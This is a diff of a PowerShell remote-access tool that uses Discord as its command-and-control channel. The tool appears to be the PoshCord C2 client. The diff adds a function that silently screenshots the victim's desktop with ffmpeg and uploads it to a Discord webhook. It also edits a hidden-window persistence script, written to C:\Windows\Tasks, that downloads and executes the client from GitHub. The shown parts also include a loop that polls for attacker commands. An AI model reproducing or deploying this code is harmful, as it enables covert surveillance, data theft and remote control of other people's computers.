@@ -52,8 +52,6 @@ if(Test-Path "C:\Windows\Tasks\service.vbs"){
     rm -path "C:\Windows\Tasks\service.vbs" -Force
 }
 
-# =============================================================================== HELP FUNCTIONS ===================================================================================
-
 Function Options {
     $embed = @{
         "title" = "Discord C2 Options"
@@ -145,8 +143,6 @@ This Eg. will scan 192.168.1.1 to 192.168.1.254
     
     Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $json
 }
-
-# =============================================================================== MODULE FUNCTIONS ===================================================================================
 
 Function FolderTree{
     tree $env:USERPROFILE/Desktop /A /F | Out-File $env:temp/Desktop.txt
@@ -804,7 +800,19 @@ Function TakePicture {
     Remove-Item -Path $imagePath -Force
 }
 
-Function ScreenShot {
+Function Screenshot {
+    $Path = "$env:Temp\ffmpeg.exe"
+    If (!(Test-Path $Path)){  
+        GetFfmpeg
+    }
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Taking a screenshot..`` :arrows_counterclockwise:"} | ConvertTo-Json
+    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    
+    $mkvPath = "$env:Temp\ScreenClip.jpg"
+    .$env:Temp\ffmpeg.exe -f gdigrab -i desktop -frames:v 1 -vf "fps=1" $mkvPath
+    curl.exe -F file1=@"$mkvPath" $hookurl | Out-Null
+    sleep 1
+    rm -Path $mkvPath -Force
 
 }
 
@@ -848,7 +856,7 @@ Function KeyCapture {
             $tobat = @"
 Set WshShell = WScript.CreateObject(`"WScript.Shell`")
 WScript.Sleep 200
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$tk'; `$ch='$ch'; `$hookurl='$hookurl'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; `$ch='$chan'; `$dc='$hookurl'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
 "@
             $tobat | Out-File -FilePath $VBpath -Force
             sleep 1
@@ -871,8 +879,7 @@ WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$tk'; `$ch='$c
     }
 }
 
-# =============================================================================== MAIN FUNCTIONS ===================================================================================
-
+# =================================================================================
 Function WaitingMsg {
 $jsonPayload = @{
     tts        = $false
@@ -1022,15 +1029,19 @@ Function Authenticate{
         $script:previouscmd = $response
     } 
 }
-# =============================================================================== MAIN LOOP ===================================================================================
+
+# =================================================================================
+
 PullMsg
 $previouscmd = $response
 VersionCheck
 WaitingMsg
 
 while($true){
+
     PullMsg
     if (!($response -like "$previouscmd")) {
+
         Write-Output "Command found!"
         if($authenticated -eq 1){
             if ($response -like "close") {
